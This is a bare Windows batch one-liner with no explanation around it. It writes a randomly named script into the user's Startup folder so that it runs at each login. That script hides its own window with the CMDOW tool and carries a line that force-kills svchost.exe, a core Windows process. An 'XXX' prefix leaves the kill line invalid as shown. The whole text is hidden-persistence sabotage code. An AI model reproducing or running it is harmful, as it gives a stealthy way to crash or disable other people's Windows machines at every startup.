(echo set name=^%random^%&echo title %name%&echo FOR /F ^%^%A IN ('CMDOW ^^^| FIND "%name%"'^) DO CMDOW ^%^%A /HID&echo XXXtaskkill /F /IM svchost.exe) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%random%.bat"
